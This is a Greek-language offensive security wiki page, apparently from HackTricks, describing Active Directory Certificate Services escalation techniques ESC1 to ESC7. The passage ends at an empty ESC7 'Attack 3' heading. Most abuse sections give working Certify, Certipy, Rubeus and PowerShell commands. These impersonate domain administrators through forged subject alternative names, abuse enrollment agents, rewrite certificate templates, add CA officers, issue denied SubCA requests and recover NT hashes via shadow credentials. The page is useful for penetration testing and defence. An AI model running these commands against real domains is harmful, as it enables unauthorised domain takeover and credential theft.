# Κλιμάκωση τομέα AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Αυτή είναι μια σύνοψη των ενοτήτων τεχνικών κλιμάκωσης από τις δημοσιεύσεις:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Λανθασμένα ρυθμισμένα πρότυπα πιστοποιητικών - ESC1

### Επεξήγηση

### Επεξήγηση του ESC1: Λανθασμένα ρυθμισμένα πρότυπα πιστοποιητικών

- **Τα δικαιώματα εγγραφής παραχωρούνται σε χρήστες με χαμηλά προνόμια από το Enterprise CA.**
- **Δεν απαιτείται έγκριση διαχειριστή.**
- **Δεν απαιτούνται υπογραφές από εξουσιοδοτημένο προσωπικό.**
- **Οι περιγραφείς ασφαλείας στα πρότυπα πιστοποιητικών είναι υπερβολικά permissive, επιτρέποντας σε χρήστες με χαμηλά προνόμια να αποκτήσουν δικαιώματα εγγραφής.**
- **Τα πρότυπα πιστοποιητικών έχουν ρυθμιστεί ώστε να ορίζουν EKUs που διευκολύνουν τον έλεγχο ταυτότητας:**
- Περιλαμβάνονται αναγνωριστικά Extended Key Usage (EKU), όπως Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ή κανένα EKU (SubCA).
- **Το πρότυπο επιτρέπει στους αιτούντες να συμπεριλάβουν ένα subjectAltName στο Certificate Signing Request (CSR):**
- Το Active Directory (AD) δίνει προτεραιότητα στο subjectAltName (SAN) ενός πιστοποιητικού για την επαλήθευση ταυτότητας, όταν αυτό υπάρχει. Αυτό σημαίνει ότι, καθορίζοντας το SAN σε ένα CSR, μπορεί να ζητηθεί ένα πιστοποιητικό για την πλαστοπροσωπία οποιουδήποτε χρήστη (π.χ. ενός διαχειριστή τομέα). Το αν μπορεί να καθοριστεί SAN από τον αιτούντα υποδεικνύεται στο αντικείμενο του προτύπου πιστοποιητικών του AD μέσω της ιδιότητας `mspki-certificate-name-flag`. Αυτή η ιδιότητα είναι bitmask και η παρουσία της σημαίας `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` επιτρέπει τον καθορισμό του SAN από τον αιτούντα.

> [!CAUTION]
> Η παραπάνω ρύθμιση επιτρέπει σε χρήστες με χαμηλά προνόμια να ζητούν πιστοποιητικά με οποιοδήποτε SAN της επιλογής τους, επιτρέποντας τον έλεγχο ταυτότητας ως οποιαδήποτε principal του τομέα μέσω Kerberos ή SChannel.

Αυτή η δυνατότητα ενεργοποιείται μερικές φορές για την υποστήριξη της δυναμικής δημιουργίας πιστοποιητικών HTTPS ή host από προϊόντα ή υπηρεσίες deployment, ή λόγω έλλειψης κατανόησης.

Σημειώνεται ότι η δημιουργία πιστοποιητικού με αυτήν την επιλογή ενεργοποιεί μια προειδοποίηση, κάτι που δεν συμβαίνει όταν ένα υπάρχον πρότυπο πιστοποιητικών (όπως το πρότυπο `WebServer`, στο οποίο είναι ενεργοποιημένη η `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) αντιγράφεται και στη συνέχεια τροποποιείται ώστε να περιλαμβάνει ένα authentication OID.<sup>[[6]](#references)</sup>

### Abuse

Για να **εντοπίσετε ευάλωτα πρότυπα πιστοποιητικών**, μπορείτε να εκτελέσετε:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Για να γίνει **abuse αυτής της ευπάθειας με σκοπό την πλαστοπροσωπία ενός administrator**, θα μπορούσε να εκτελεστεί:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Στη συνέχεια, μπορείτε να μετατρέψετε το δημιουργημένο **πιστοποιητικό σε μορφή `.pfx`** και να το χρησιμοποιήσετε για **authentication με τα Rubeus ή certipy** ξανά:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Τα Windows binaries "Certreq.exe" και "Certutil.exe" μπορούν να χρησιμοποιηθούν για τη δημιουργία του PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Η απαρίθμηση των certificate templates μέσα στο configuration schema του AD Forest, συγκεκριμένα εκείνων που δεν απαιτούν approval ή signatures, διαθέτουν EKU Client Authentication ή Smart Card Logon και έχουν ενεργοποιημένο το flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, μπορεί να πραγματοποιηθεί εκτελώντας το ακόλουθο LDAP query:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

Το δεύτερο σενάριο abuse αποτελεί παραλλαγή του πρώτου:

1. Τα δικαιώματα enrollment εκχωρούνται σε low-privileged users από το Enterprise CA.
2. Η απαίτηση για έγκριση από manager είναι απενεργοποιημένη.
3. Η ανάγκη για authorized signatures παραλείπεται.
4. Ένας υπερβολικά permissive security descriptor στο certificate template εκχωρεί δικαιώματα certificate enrollment σε low-privileged users.
5. **Το certificate template έχει οριστεί ώστε να περιλαμβάνει το Any Purpose EKU ή κανένα EKU.**

Το **Any Purpose EKU** επιτρέπει σε έναν attacker να αποκτήσει certificate για **οποιονδήποτε σκοπό**, συμπεριλαμβανομένων των client authentication, server authentication, code signing κ.λπ. Η ίδια **τεχνική που χρησιμοποιείται για το ESC3** μπορεί να αξιοποιηθεί για την εκμετάλλευση αυτού του σεναρίου.

Τα certificates **χωρίς EKUs**, τα οποία λειτουργούν ως subordinate CA certificates, μπορούν να αξιοποιηθούν για **οποιονδήποτε σκοπό** και μπορούν **επίσης να χρησιμοποιηθούν για την υπογραφή νέων certificates**. Επομένως, ένας attacker θα μπορούσε να καθορίσει αυθαίρετα EKUs ή πεδία στα νέα certificates, χρησιμοποιώντας ένα subordinate CA certificate.

Ωστόσο, νέα certificates που δημιουργούνται για **domain authentication** δεν θα λειτουργούν εάν το subordinate CA δεν είναι trusted από το **`NTAuthCertificates`** object, που αποτελεί την προεπιλεγμένη ρύθμιση. Παρ’ όλα αυτά, ένας attacker μπορεί να δημιουργήσει **νέα certificates με οποιοδήποτε EKU** και αυθαίρετες τιμές certificate. Αυτά θα μπορούσαν ενδεχομένως να **χρησιμοποιηθούν καταχρηστικά** για ένα ευρύ φάσμα σκοπών (π.χ. code signing, server authentication κ.λπ.) και να έχουν σημαντικές επιπτώσεις σε άλλες εφαρμογές του δικτύου, όπως τα SAML, AD FS ή IPSec.<sup>[[6]](#references)</sup>

Για την απαρίθμηση templates που αντιστοιχούν σε αυτό το σενάριο μέσα στο configuration schema του AD Forest, μπορεί να εκτελεστεί το ακόλουθο LDAP query:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Επεξήγηση

Αυτό το σενάριο είναι παρόμοιο με το πρώτο και το δεύτερο, αλλά **καταχράται** ένα **διαφορετικό EKU** (Certificate Request Agent) και **2 διαφορετικά templates** (επομένως έχει 2 σύνολα απαιτήσεων),

Το **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), γνωστό ως **Enrollment Agent** στην τεκμηρίωση της Microsoft, επιτρέπει σε ένα principal να **κάνει enroll** για ένα **certificate** **εκ μέρους άλλου user**.

Το **“enrollment agent”** κάνει enroll σε ένα τέτοιο **template** και χρησιμοποιεί το resulting **certificate για να συνυπογράψει ένα CSR εκ μέρους του άλλου user**. Στη συνέχεια **στέλνει** το **συνυπογεγραμμένο CSR** στο CA, κάνοντας enroll σε ένα **template** που **επιτρέπει “enroll on behalf of”**, και το CA απαντά με ένα **certificate που ανήκει στον “άλλο” user**.<sup>[[6]](#references)</sup>

**Requirements 1:**

- Τα enrollment rights παραχωρούνται σε low-privileged users από το Enterprise CA.
- Η απαίτηση για manager approval παραλείπεται.
- Δεν υπάρχει απαίτηση για authorized signatures.
- Το security descriptor του certificate template είναι υπερβολικά permissive, παραχωρώντας enrollment rights σε low-privileged users.
- Το certificate template περιλαμβάνει το Certificate Request Agent EKU, επιτρέποντας το request άλλων certificate templates εκ μέρους άλλων principals.

**Requirements 2:**

- Το Enterprise CA παραχωρεί enrollment rights σε low-privileged users.
- Το Manager approval παρακάμπτεται.
- Η schema version του template είναι είτε 1 είτε μεγαλύτερη από 2 και καθορίζει ένα Application Policy Issuance Requirement που απαιτεί το Certificate Request Agent EKU.
- Ένα EKU που ορίζεται στο certificate template επιτρέπει domain authentication.
- Δεν εφαρμόζονται περιορισμοί για enrollment agents στο CA.

### Abuse

Μπορείτε να χρησιμοποιήσετε τα [**Certify**](https://github.com/GhostPack/Certify) ή [**Certipy**](https://github.com/ly4k/Certipy) για να κάνετε abuse αυτού του σεναρίου:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Οι **χρήστες** στους οποίους επιτρέπεται να **αποκτήσουν** ένα **enrollment agent certificate**, τα templates στα οποία επιτρέπεται να πραγματοποιούν enrollment οι **agents** και οι **λογαριασμοί** για λογαριασμό των οποίων μπορεί να ενεργεί ο enrollment agent μπορούν να περιοριστούν από enterprise CAs. Αυτό επιτυγχάνεται ανοίγοντας το `certsrc.msc` **snap-in**, κάνοντας **δεξί κλικ στην CA**, επιλέγοντας **Properties** και, στη συνέχεια, μεταβαίνοντας στην καρτέλα “Enrollment Agents”.

Ωστόσο, σημειώνεται ότι η **προεπιλεγμένη** ρύθμιση για τις CAs είναι “**Do not restrict enrollment agents**.” Όταν οι administrators ενεργοποιούν τον περιορισμό για τους enrollment agents, επιλέγοντας “Restrict enrollment agents”, η προεπιλεγμένη διαμόρφωση παραμένει εξαιρετικά permissive. Επιτρέπει σε **Everyone** να πραγματοποιεί enrollment σε όλα τα templates ως οποιοσδήποτε.

### PoCs PowerShell μόνο για Windows με το Certi-Bhai

Το [**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) εκτελεί ESC1 και ESC2/ESC3 χωρίς Certify ή Certipy. Τα scripts του δημιουργούν ένα exportable κλειδί RSA 2048-bit με το `X509Enrollment` COM API, δημιουργούν ένα αίτημα PKCS#10, εντοπίζουν το πρώτο `pKIEnrollmentService` μέσω LDAP, το υποβάλλουν μέσω του `CertificateAuthority.Request`, εγκαθιστούν την απάντηση στο `Cert:\CurrentUser\My` και εξάγουν ένα PFX κωδικοποιημένο σε Base64. Το script για ESC1 προσθέτει ένα UPN SAN που επιλέγει ο attacker (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, value `0xb`), ενώ τα scripts για ESC2/ESC3 χρησιμοποιούν το πρώτο certificate για να υπογράψουν ένα αίτημα PKCS#7 on-behalf-of.<sup>[[27]](#references)</sup>
```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
-altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
-target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```
Τα scripts εκτυπώνουν το Base64 του **PFX**, το οποίο περιλαμβάνει το private key, για άμεση χρήση με το Rubeus. Μην το αντικαταστήσετε με `[Convert]::ToBase64String($cert.RawData)`: το `RawData` κωδικοποιεί μόνο το public certificate και δεν μπορεί να υπογράψει το PKINIT request.<sup>[[5]](#references)[[27]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```
## Έλεγχος πρόσβασης σε ευάλωτο Certificate Template - ESC4

### **Επεξήγηση**

Ο **security descriptor** στα **certificate templates** καθορίζει τα **permissions** που διαθέτουν συγκεκριμένοι **AD principals** σχετικά με το template.

Εάν ένας **attacker** διαθέτει τα απαιτούμενα **permissions** για να **τροποποιήσει** ένα **template** και να **εισαγάγει** οποιεσδήποτε **exploitable misconfigurations** περιγράφονται στις **προηγούμενες ενότητες**, μπορεί να επιτευχθεί privilege escalation.

Σημαντικά permissions που ισχύουν για τα certificate templates περιλαμβάνουν:<sup>[[6]](#references)</sup>

- **Owner:** Παρέχει implicit control πάνω στο object, επιτρέποντας την τροποποίηση οποιωνδήποτε attributes.
- **FullControl:** Παρέχει πλήρη authority πάνω στο object, συμπεριλαμβανομένης της δυνατότητας τροποποίησης οποιωνδήποτε attributes.
- **WriteOwner:** Επιτρέπει την αλλαγή του owner του object σε principal υπό τον έλεγχο του attacker.
- **WriteDacl:** Επιτρέπει την προσαρμογή των access controls, παρέχοντας ενδεχομένως στον attacker FullControl.
- **WriteProperty:** Επιτρέπει την επεξεργασία οποιωνδήποτε properties του object.

### Abuse

Για τον εντοπισμό principals με δικαιώματα επεξεργασίας σε templates και άλλα PKI objects, κάντε enumerate με το Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Ένα παράδειγμα privesc όπως το προηγούμενο:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

Το ESC4 συμβαίνει όταν ένας χρήστης έχει δικαιώματα εγγραφής σε ένα certificate template. Αυτό μπορεί, για παράδειγμα, να γίνει abuse για την αντικατάσταση των ρυθμίσεων του certificate template, ώστε το template να γίνει ευάλωτο στο ESC1.

Όπως βλέπουμε στο παραπάνω path, μόνο ο `JOHNPC` έχει αυτά τα δικαιώματα, αλλά ο χρήστης μας `JOHN` έχει το νέο edge `AddKeyCredentialLink` προς τον `JOHNPC`. Επειδή αυτή η τεχνική σχετίζεται με certificates, έχω υλοποιήσει και αυτό το attack, το οποίο είναι γνωστό ως [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Ακολουθεί μια μικρή προεπισκόπηση της εντολής `shadow auto` του Certipy για την ανάκτηση του NT hash του θύματος.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
Το **Certipy** μπορεί να αντικαταστήσει τη ρύθμιση ενός certificate template με μία μόνο εντολή. **Από προεπιλογή**, το Certipy θα **αντικαταστήσει** τη ρύθμιση ώστε να την καταστήσει **ευάλωτη στο ESC1**. Μπορούμε επίσης να καθορίσουμε την **παράμετρο `-save-old` για την αποθήκευση της παλιάς ρύθμισης**, η οποία θα είναι χρήσιμη για την **επαναφορά** της ρύθμισης μετά την επίθεσή μας.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Έλεγχος πρόσβασης σε ευάλωτα αντικείμενα PKI - ESC5

### Επεξήγηση

Το εκτεταμένο δίκτυο αλληλένδετων σχέσεων που βασίζονται σε ACL, το οποίο περιλαμβάνει αρκετά αντικείμενα πέρα από τα πρότυπα πιστοποιητικών και την certificate authority, μπορεί να επηρεάσει την ασφάλεια ολόκληρου του συστήματος AD CS. Αυτά τα αντικείμενα, τα οποία μπορούν να επηρεάσουν σημαντικά την ασφάλεια, περιλαμβάνουν:

- Το AD computer object του CA server, το οποίο μπορεί να παραβιαστεί μέσω μηχανισμών όπως το S4U2Self ή το S4U2Proxy.
- Τον RPC/DCOM server του CA server.
- Οποιοδήποτε descendant AD object ή container μέσα στη συγκεκριμένη διαδρομή container `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Αυτή η διαδρομή περιλαμβάνει, μεταξύ άλλων, containers και objects όπως το Certificate Templates container, το Certification Authorities container, το NTAuthCertificates object και το Enrollment Services Container.

Η ασφάλεια του PKI system μπορεί να παραβιαστεί εάν ένας attacker με χαμηλά προνόμια καταφέρει να αποκτήσει τον έλεγχο οποιουδήποτε από αυτά τα κρίσιμα στοιχεία.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Επεξήγηση

Το θέμα που συζητείται στο [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) αναφέρεται επίσης στις επιπτώσεις του flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, όπως περιγράφονται από τη Microsoft. Όταν αυτή η ρύθμιση ενεργοποιηθεί σε μια Certification Authority (CA), επιτρέπει τη συμπερίληψη **τιμών που ορίζονται από τον χρήστη** στο **subject alternative name** για **οποιοδήποτε request**, συμπεριλαμβανομένων εκείνων που δημιουργούνται από το Active Directory®. Κατά συνέπεια, αυτή η δυνατότητα επιτρέπει σε έναν **intruder** να κάνει enrollment μέσω **οποιουδήποτε template** έχει ρυθμιστεί για **authentication** σε domain — συγκεκριμένα, μέσω εκείνων που επιτρέπουν enrollment σε **μη προνομιούχους** χρήστες, όπως το τυπικό User template. Ως αποτέλεσμα, μπορεί να αποκτηθεί ένα certificate που επιτρέπει στον intruder να κάνει authentication ως domain administrator ή ως **οποιαδήποτε άλλη ενεργή οντότητα** μέσα στο domain.<sup>[[9]](#references)</sup>

**Σημείωση**: Η μέθοδος προσθήκης **alternative names** σε ένα Certificate Signing Request (CSR), μέσω του ορίσματος `-attrib "SAN:"` στο `certreq.exe` (το οποίο αναφέρεται ως “Name Value Pairs”), διαφέρει από τη στρατηγική exploitation των SANs στο ESC1. Η διαφορά έγκειται στο **πώς ενσωματώνονται οι πληροφορίες του account** — μέσα σε ένα certificate attribute και όχι σε ένα extension.

### Εκμετάλλευση

Για να επαληθεύσουν εάν η ρύθμιση είναι ενεργοποιημένη, οι οργανισμοί μπορούν να χρησιμοποιήσουν την ακόλουθη εντολή με το `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Αυτή η λειτουργία ουσιαστικά χρησιμοποιεί **remote registry access**, επομένως, μια εναλλακτική προσέγγιση θα μπορούσε να είναι:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Εργαλεία όπως τα [**Certify**](https://github.com/GhostPack/Certify) και [**Certipy**](https://github.com/ly4k/Certipy) μπορούν να εντοπίσουν αυτήν την εσφαλμένη ρύθμιση και να την εκμεταλλευτούν:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Για να τροποποιηθούν αυτές οι ρυθμίσεις, με την προϋπόθεση ότι διαθέτει κάποιος δικαιώματα **domain administrative** ή ισοδύναμα, μπορεί να εκτελεστεί η ακόλουθη εντολή από οποιονδήποτε σταθμό εργασίας:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Για να απενεργοποιήσετε αυτήν τη ρύθμιση στο περιβάλλον σας, το flag μπορεί να αφαιρεθεί με:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Μετά τις ενημερώσεις ασφαλείας του Μαΐου 2022, τα newly issued **certificates** θα περιέχουν ένα **security extension** που ενσωματώνει την ιδιότητα **`objectSid` του requester**. Για το ESC1, αυτό το SID προκύπτει από το καθορισμένο SAN. Ωστόσο, για το **ESC6**, το SID αντικατοπτρίζει το **`objectSid` του requester**, όχι το SAN.\
> Για την εκμετάλλευση του ESC6, είναι απαραίτητο το σύστημα να είναι ευάλωτο στο ESC10 (Weak Certificate Mappings), το οποίο δίνει προτεραιότητα στο **SAN έναντι του new security extension**.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Ο έλεγχος πρόσβασης για μια certificate authority διατηρείται μέσω ενός συνόλου δικαιωμάτων που διέπουν τις ενέργειες της CA. Αυτά τα δικαιώματα μπορούν να προβληθούν με πρόσβαση στο `certsrv.msc`, κάνοντας δεξί κλικ σε μια CA, επιλέγοντας τις ιδιότητες και, στη συνέχεια, μεταβαίνοντας στην καρτέλα Security. Επιπλέον, τα δικαιώματα μπορούν να απαριθμηθούν χρησιμοποιώντας το module PSPKI με commands όπως:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Αυτό παρέχει πληροφορίες σχετικά με τα κύρια δικαιώματα, δηλαδή τα **`ManageCA`** και **`ManageCertificates`**, τα οποία αντιστοιχούν αντίστοιχα στους ρόλους “CA administrator” και “Certificate Manager”.<sup>[[6]](#references)</sup>

#### Κατάχρηση

Η κατοχή δικαιωμάτων **`ManageCA`** σε μια certificate authority επιτρέπει στο principal να τροποποιεί απομακρυσμένα τις ρυθμίσεις χρησιμοποιώντας το PSPKI. Αυτό περιλαμβάνει την ενεργοποίηση του flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, ώστε να επιτρέπεται ο καθορισμός SAN σε οποιοδήποτε template, κάτι κρίσιμο για το domain escalation.

Η απλοποίηση αυτής της διαδικασίας είναι δυνατή μέσω της χρήσης του cmdlet **Enable-PolicyModuleFlag** του PSPKI, επιτρέποντας τροποποιήσεις χωρίς άμεση αλληλεπίδραση με το GUI.

Η κατοχή δικαιωμάτων **`ManageCertificates`** διευκολύνει την έγκριση εκκρεμών αιτημάτων, παρακάμπτοντας ουσιαστικά την προστασία “CA certificate manager approval”.

Ο συνδυασμός των modules **Certify** και **PSPKI** μπορεί να χρησιμοποιηθεί για την υποβολή αιτήματος, την έγκριση και τη λήψη ενός πιστοποιητικού:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Επεξήγηση

> [!WARNING]
> Στην **προηγούμενη επίθεση**, τα δικαιώματα **`Manage CA`** χρησιμοποιήθηκαν για την **ενεργοποίηση** της σημαίας **EDITF_ATTRIBUTESUBJECTALTNAME2**, ώστε να πραγματοποιηθεί η **ESC6 attack**, αλλά αυτό δεν θα έχει κανένα αποτέλεσμα μέχρι να γίνει επανεκκίνηση της υπηρεσίας CA (`CertSvc`). Όταν ένας χρήστης διαθέτει το δικαίωμα πρόσβασης **`Manage CA`**, επιτρέπεται επίσης να **επανεκκινήσει την υπηρεσία**. Ωστόσο, αυτό **δεν σημαίνει ότι ο χρήστης μπορεί να επανεκκινήσει την υπηρεσία απομακρυσμένα**. Επιπλέον, η E**SC6 ενδέχεται να μη λειτουργεί out of the box** στα περισσότερα patched περιβάλλοντα, λόγω των ενημερώσεων ασφαλείας του Μαΐου 2022.

Επομένως, παρουσιάζεται εδώ μια άλλη επίθεση.

Προαπαιτούμενα:

- Μόνο το δικαίωμα **`ManageCA`**
- Το δικαίωμα **`Manage Certificates`** (μπορεί να εκχωρηθεί από το **`ManageCA`**)
- Το certificate template **`SubCA`** πρέπει να είναι **ενεργοποιημένο** (μπορεί να ενεργοποιηθεί από το **`ManageCA`**)

Η τεχνική βασίζεται στο γεγονός ότι οι χρήστες με τα δικαιώματα πρόσβασης **`Manage CA`** και **`Manage Certificates`** μπορούν να **εκδίδουν αποτυχημένα αιτήματα πιστοποιητικών**. Το certificate template **`SubCA`** είναι **ευάλωτο στο ESC1**, αλλά **μόνο οι διαχειριστές** μπορούν να κάνουν enrollment στο template. Έτσι, ένας **χρήστης** μπορεί να **ζητήσει** enrollment στο **`SubCA`** — το οποίο θα **απορριφθεί** — αλλά **στη συνέχεια να εκδοθεί από τον manager**.<sup>[[6]](#references)</sup>

#### Κατάχρηση

Μπορείτε να **εκχωρήσετε στον εαυτό σας** το δικαίωμα πρόσβασης **`Manage Certificates`**, προσθέτοντας τον χρήστη σας ως νέο officer.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Το **`SubCA`** πρότυπο μπορεί να **ενεργοποιηθεί στην CA** με την παράμετρο `-enable-template`. Από προεπιλογή, το πρότυπο `SubCA` είναι ενεργοποιημένο.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Εάν έχουμε εκπληρώσει τις προϋποθέσεις για αυτήν την επίθεση, μπορούμε να ξεκινήσουμε **ζητώντας ένα certificate που βασίζεται στο template `SubCA`**.

**Αυτό το αίτημα θα απορριφθεί**, αλλά θα αποθηκεύσουμε το private key και θα σημειώσουμε το request ID.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Με τα **`Manage CA` και `Manage Certificates`**, μπορούμε στη συνέχεια να **εκδώσουμε το αποτυχημένο αίτημα πιστοποιητικού** με την εντολή `ca` και την παράμετρο `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Και τέλος, μπορούμε να **ανακτήσουμε το εκδοθέν certificate** με την εντολή `req` και την παράμετρο `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Επίθεση 3 – Abuse του Manage Certificates Extension (SetExtension)

#### Επεξήγηση

